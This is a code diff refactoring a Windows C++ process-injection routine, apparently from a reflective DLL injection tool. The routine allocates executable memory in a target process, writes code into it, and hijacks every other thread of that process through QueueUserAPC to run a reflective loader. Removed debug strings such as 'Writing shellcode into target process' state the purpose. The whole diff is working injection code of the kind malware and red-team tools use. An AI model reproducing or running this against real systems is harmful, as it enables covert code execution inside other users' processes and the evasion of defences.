@@ -30,8 +30,42 @@
 #include <TlHelp32.h>
 #include <assert.h>
 #include <string>
+#include <vector>
+#include <atlbase.h>
 
 using namespace std;
+using namespace ATL;
+
+vector<DWORD> getProcessThreads(DWORD pid)
+{
+    auto snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (INVALID_HANDLE_VALUE == snapshot)
+    {
+        return {};
+    }
+
+    THREADENTRY32 te32;
+    te32.dwSize = sizeof(te32);
+
+    if (!::Thread32First(snapshot, &te32))
+    {
+        ::CloseHandle(snapshot);
+        return {};
+    }
+
+    vector<DWORD> tids;
+
+    do 
+    {
+        if (te32.th32OwnerProcessID == pid)
+        {
+            tids.push_back(te32.th32ThreadID);
+        }
+    } while (::Thread32Next(snapshot, &te32));
+
+    ::CloseHandle(snapshot);
+    return tids;
+}
 
 //===============================================================================================//
 DWORD Rva2Offset( DWORD dwRva, UINT_PTR uiBaseAddress )
@@ -401,85 +435,50 @@ void APCProcEnd()
 }
 #pragma runtime_checks("", restore)
 
-BOOL InjectUsingQueueUserAPC(HANDLE hProcess, LPTHREAD_START_ROUTINE lpReflectiveLoader, PVOID lpParameter)
+bool InjectUsingQueueUserAPC(HANDLE hProcess, LPTHREAD_START_ROUTINE startRoutine, PVOID lpParameter)
 {
-    PDWORD_PTR pdwptr = NULL;
-    THREADENTRY32 te32;
-    CONTEXT ctx;
-    LPBYTE ptr = 0;
-    PVOID mem = 0;
-    int found = 0;
-    HANDLE hSnap = NULL;
-    DWORD processId = GetProcessId(hProcess);
-    DWORD currentThreadId = GetCurrentThreadId();
-    DWORD targetThreadId = 0;
-    HANDLE targetThread = NULL;
+    const DWORD processId = ::GetProcessId(hProcess);
+    const DWORD currentThreadId = ::GetCurrentThreadId();
 
-    if (processId == GetCurrentProcessId())
+    if (processId == ::GetCurrentProcessId())
     {
-        CreateThread(NULL, 0, DummyThreadFn, 0, 0, NULL);
-        YieldProcessor();
+        ::CreateThread(NULL, 0, DummyThreadFn, 0, 0, NULL);
+        ::YieldProcessor();
     }
 
-    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);;
-
-    te32.dwSize = sizeof(te32);
-    ctx.ContextFlags = CONTEXT_FULL;
-
-    Thread32First(hSnap, &te32);
-    printf("\nFinding a thread to hijack.\n");
-
-    while (Thread32Next(hSnap, &te32))
+    auto mem = ::VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!mem)
     {
-        if (te32.th32OwnerProcessID == processId)
+        printf("\nError: Unable to allocate memory in target process (%d)", GetLastError());
+        return false;
+    }
+
+    if (!::WriteProcessMemory(hProcess, mem, &APCProc, (DWORD_PTR)&APCProcEnd - (DWORD_PTR)&APCProc, NULL))
+    {
+        return false;
+    }
+
+    for (auto tid : getProcessThreads(processId))
+    {
+        if (tid == currentThreadId)
         {
-            if (currentThreadId == te32.th32ThreadID)
-            {
-                continue;
-            }
-
-            targetThreadId = te32.th32ThreadID;
-
-            printf("\nTarget thread found. Thread ID: %d", targetThreadId);
-
-            printf("\nAllocating memory in target process.");
-
-            mem = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-            if (!mem)
-            {
-                printf("\nError: Unable to allocate memory in target process (%d)", GetLastError());
-                continue;
-            }
-
-            printf("\nMemory allocated at %p", mem);
-            printf("\nOpening target thread handle %d.", targetThreadId);
-
-            targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);
-
-            if (!targetThread)
-            {
-                printf("\nError: Unable to open target thread handle (%d)\n", GetLastError());
-                continue;
-            }
-
-            printf("\nWriting shellcode into target process.");
-
-            if (!WriteProcessMemory(hProcess, mem, &APCProc, (DWORD_PTR)&APCProcEnd - (DWORD_PTR)&APCProc, NULL))
-            {
-                continue;
-            }
-
-            printf("\nHijacking target thread.");
-
-            if (!QueueUserAPC((PAPCFUNC)mem, targetThread, (DWORD_PTR)lpReflectiveLoader))
-            {
-                printf("\nError: Unable to hijack target thread (%d)\n", GetLastError());
-                continue;
-            }
-
-            CloseHandle(targetThread);
+            continue;
         }
+
+        CHandle targetThread(::OpenThread(THREAD_ALL_ACCESS, FALSE, tid));
+        if (!targetThread)
+        {
+            printf("\nError: Unable to open target thread handle (%d)\n", GetLastError());
+            continue;
+        }
+
+        printf("\nHijacking target thread.");
+
+        if (!::QueueUserAPC(reinterpret_cast<PAPCFUNC>(mem), targetThread, reinterpret_cast<DWORD_PTR>(startRoutine)))
+        {
+            printf("\nError: Unable to hijack target thread (%d)\n", GetLastError());
+            continue;
+        }        
     }
 
     return TRUE;
